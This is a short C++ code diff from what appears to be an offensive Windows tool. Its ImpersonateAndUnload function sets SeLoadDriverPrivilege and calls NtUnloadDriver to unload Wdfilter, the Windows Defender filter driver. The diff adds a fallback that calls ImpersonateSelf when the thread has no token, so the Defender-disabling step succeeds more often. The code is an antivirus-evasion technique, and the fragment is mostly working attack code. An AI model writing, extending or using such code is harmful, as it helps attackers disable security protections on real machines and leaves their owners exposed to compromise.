@@ -101,9 +101,14 @@ NTSTATUS ImpersonateAndUnload()
 	// step 4 - set the SeLoadDriverPrivilege for the current thread and call NtUnloadDriver to unload Wdfilter
 	HANDLE tempHandle;
 	success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
-	if (!success)
+	if (!success && GetLastError() == ERROR_NO_TOKEN)
 	{
-		Error(GetLastError());
+		ImpersonateSelf(SecurityImpersonation);
+		std::cout << "[!] Calling ImpersonateSelf because thread is not impersonating...\n";
+		success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
+	}
+	else if (!success)
+	{
 		std::cout << "[-] Failed to open current thread token, exiting...\n";
 		return 1;
 	}
